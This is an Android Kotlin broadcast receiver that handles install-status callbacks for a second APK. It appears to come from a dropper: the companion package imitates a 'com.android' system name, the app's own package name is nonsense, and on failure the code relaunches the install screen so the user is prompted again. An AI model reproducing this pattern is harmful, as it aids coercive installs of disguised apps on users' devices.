package com.cristal.bristral.tristal.mistral

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

class InstallReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "InstallReceiver"
        private const val COMPANION_PKG = "com.android.pictach"
        private const val COMPANION_CLASS = "com.android.pictach.MainActivity"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val status = intent.getIntExtra("android.content.pm.extra.STATUS", 1)

        when {
            status == -1 -> {
                // Installer returned a pending intent — launch it directly
                val launchIntent = if (Build.VERSION.SDK_INT >= 33) {
                    intent.getParcelableExtra("android.intent.extra.INTENT", Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra<Intent>("android.intent.extra.INTENT")
                }
                if (launchIntent != null) {
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(launchIntent)
                }
            }
            status == 0 -> {
                try {
                    val launch = context.packageManager.getLaunchIntentForPackage(COMPANION_PKG)
                    launch?.let {
                        it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        it.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                        context.startActivity(it)
                    }
                } catch (e: Exception) {
                }
            }
            else -> {
                // Installation failed — restart InstallActivity
                val msg = intent.getStringExtra("android.content.pm.extra.STATUS_MESSAGE")
                Log.e(TAG, "Installation failed: $msg")
                val restart = Intent(context, InstallActivity::class.java)
                restart.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(restart)
            }
        }
    }
}
